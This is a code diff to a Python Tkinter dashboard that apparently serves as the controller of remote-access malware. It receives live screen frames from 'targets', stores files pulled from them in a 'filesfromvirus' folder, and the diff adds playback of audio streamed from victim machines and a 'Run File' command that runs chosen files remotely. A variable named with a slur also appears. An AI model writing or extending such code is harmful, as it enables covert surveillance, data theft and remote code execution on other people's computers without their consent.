@@ -8,6 +8,37 @@ import time
 import websocket
 from io import BytesIO
 from PIL import Image, ImageTk
+import pyaudio
+import queue
+
+FORMAT = pyaudio.paInt16
+CHANNELS = 2
+RATE = 16000
+
+p = pyaudio.PyAudio()
+stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True)
+
+audio_queue = queue.Queue()
+
+# Dedicated worker function that plays audio chunks sequentially
+def audio_player_worker():
+    print("🤖 Playback worker thread started.")
+    while True:
+        # .get() will block and wait efficiently until an item is available
+        raw_audio = audio_queue.get()
+        if raw_audio is None: 
+            break # Exit signal
+        
+        try:
+            stream.write(raw_audio)
+        except Exception as e:
+            print(f"Playback error: {e}")
+        
+        audio_queue.task_done()
+
+# Start the single, permanent background worker thread
+worker_thread = threading.Thread(target=audio_player_worker, daemon=True)
+worker_thread.start()
 
 available_targets = []
 live_frames = {}
@@ -75,6 +106,9 @@ class ViewerDashboard(tk.Tk):
         self.download_file = tk.Button(ops_frame, text="Download File", bg="#CC06CC", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_download_file_click)
         self.download_file.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(3, 0))
 
+        self.run_file = tk.Button(ops_frame, text="Run File", bg="#CC0631", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_run_file_click)
+        self.run_file.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(3, 0))
+
         self.refresh_files_btn = tk.Button(
             self.file_frame, text="🔄 Refresh Current Window", 
             bg="#2e4053", fg="white", font=("Arial", 9, "bold"), relief=tk.FLAT,
@@ -121,6 +155,12 @@ class ViewerDashboard(tk.Tk):
                         available_targets = payload.get("data", [])
                     elif p_type == "frame":
                         live_frames[payload.get("user")] = payload.get("frame")
+                        audio_string = payload.get("audio")
+                        
+                        if audio_string:
+                            # Decode base64 back to raw bytes
+                            raw_audio_data = base64.b64decode(audio_string.encode('utf-8'))
+                            audio_queue.put(raw_audio_data)
                     elif p_type == "file_list":
                         target_name = payload.get("user")
                         # Capture directory snapshot dictionary securely
@@ -135,7 +175,7 @@ class ViewerDashboard(tk.Tk):
                             filename = payload.get("filename", "")
                             base64_data = payload.get("data_b64", "")
                             if filename and base64_data:
-                                nig = f"/filesfromvirus/{target_name}/downloads/"
+                                nig = f"filesfromvirus/{target_name}/downloads/"
                                 if not os.path.exists(nig):
                                     os.makedirs(nig)
 
@@ -276,6 +316,21 @@ class ViewerDashboard(tk.Tk):
                 dialog.destroy()
                 
             ttk.Button(dialog, text="Apply Changes", command=submit).pack(pady=5)
+
+    def _on_run_file_click(self):
+        selection = self.file_listbox.curselection()
+        if selection and self.selected_target and self.ws:
+            selected_item = self.file_listbox.get(selection[0])
+            # Strip whatever emoji type prefix exists (folder or file)
+            item_clean = selected_item.replace("📁 ", "").replace("📄 ", "")
+            
+            self.ws.send(json.dumps({
+                "type": "viewer_frame",
+                "target": self.selected_target,
+                "command": "run_item",
+                "target_path": self.current_remote_path,
+                "item_name": item_clean
+            }))
 
     def _on_download_file_click(self):
         selection = self.file_listbox.curselection()
